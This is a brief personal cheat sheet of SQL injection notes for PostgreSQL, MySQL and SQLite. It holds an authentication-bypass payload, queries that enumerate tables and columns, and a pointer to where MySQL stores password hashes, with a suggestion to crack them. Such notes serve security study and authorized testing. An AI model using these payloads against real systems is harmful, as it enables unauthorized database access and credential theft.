# SQL Injection

[SQL Injection Cheat Sheet | Netsparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

### Postgres

**Column names case sensitive!!**

Syntax: `ad' || 'min'  or 1=1;--`

Version: `version()`

Quotes: Single for values, double for column name

[PostgreSQL: Documentation: 13: Chapter 51. System Catalogs](https://www.postgresql.org/docs/13/catalogs.html)

List tables: `select table_name from information_schema.tables`

List columns: `select column_name from information_schema.columns where table_name = 'table'`

### MySQL

**Column names not case sensitive**

Note: `Password` column of `mysql.user` only exists in mariadb. Use `authentication_string` for vanilla mysql. May have to use crackstation.

[mysql.user Table - MariaDB Knowledge Base](https://mariadb.com/kb/en/mysqluser-table/)

### Sqlite

**Column names not case sensitive**

Metadata:

[The Schema Table (sqlite.org)](https://sqlite.org/schematab.html)

List tables and sql: `select tbl_name, sql from sqlite_master `